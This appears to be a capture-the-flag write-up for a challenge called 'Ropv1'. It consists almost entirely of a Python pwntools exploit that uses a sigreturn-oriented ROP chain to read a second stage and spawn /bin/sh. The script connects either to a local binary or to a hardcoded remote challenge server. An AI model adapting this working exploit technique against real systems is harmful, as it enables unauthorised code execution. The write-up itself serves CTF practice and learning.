# Ropv1
## TLDR
Signal ROP using provided gadget.

## Complete write up
To do soon

## Solution
```python
#!/usr/bin/python2
from pwn import *
from sys import *

context.arch = "amd64"
# context.arch = "i386"

e = ELF('challs')
if(len(argv) == 2):
    p = connect("193.57.159.27", 64455  )
    # p = connect("localhost", 5000)
else:
    p = process('challs')
    # p = gdb.debug('./challs', '''b *0x401067
    # ''')

'''
0x0000000000401091 : mov rax, rsi ; ret
0x000000000040108d : mov rsi, rax ; ret
0x0000000000401089 : mov rax, rdi ; ret
0x0000000000401079 : mov eax, 6 ; ret
0x000000000040107f : mov eax, 9 ; ret
0x00000000004010a1 : add rax, rdi ; ret
0x0000000000401085 : mov rdi, rax ; ret
0x0000000000401099 : mov rax, rdx ; ret
0x0000000000401091 : mov rax, rsi ; ret
0x0000000000401085 : mov rdi, rax ; ret
0x0000000000401095 : mov rdx, rax ; ret
0x000000000040108d : mov rsi, rax ; ret
'''
pload = "B" * 8
syscall = 0x0000000000401020
# read again

# pload += p64(0x0000000000401018)

# this ROP would set $rax=0xf to call sigreturn
# mov eax 9
pload += p64(0x000000000040107f)
# mov rdi, rax
pload += p64(0x0000000000401085)
# mov eax, 6 ; ret
pload += p64(0x0000000000401079)
# add rax, rdi
pload += p64(0x00000000004010a1)
# syscall
pload += p64(syscall)

# srop to read to bss
frame = SigreturnFrame()
frame.rax = 0                   # syscall read
frame.rdi = 0                   # fd in
frame.rsi = 0x0000000000402000  # read ptr
frame.rdx = 0x500               # size
frame.rsp = 0x402088            # pivot
frame.rip = syscall

pload += str(frame)

pload += "\x00"*(4096 - len(pload))


p.send(pload)

pload = ""

# overwrite global var checker to null
pload += '\x00' * 8 

# padding to rip
pload += "\x00" * 0x88

# this ROP would set $rax=0xf to call sigreturn
# mov eax 9
pload += p64(0x000000000040107f)
# mov rdi, rax
pload += p64(0x0000000000401085)
# mov eax, 6 ; ret
pload += p64(0x0000000000401079)
# add rax, rdi
pload += p64(0x00000000004010a1)
# syscall
pload += p64(syscall)


# srop to execve /bin/bash
frame = SigreturnFrame()
frame.rax = 0x3b                # exec
frame.rdi = 0x4021b1            # base address
frame.rsi = 0                   # size
frame.rdx = 0                   # size
frame.rsp = 0x0000000000400018  # make sure rsp not null
frame.rip = syscall
pload += str(frame)


pload += "\x00/bin/sh\x00"
pload += "A" * (0x500 - len(pload))
p.send(pload)

''' 
# build docker
sudo docker build -t getting-started .
sudo docker run -dp 5000:5000 getting-started
'''

p.interactive()
```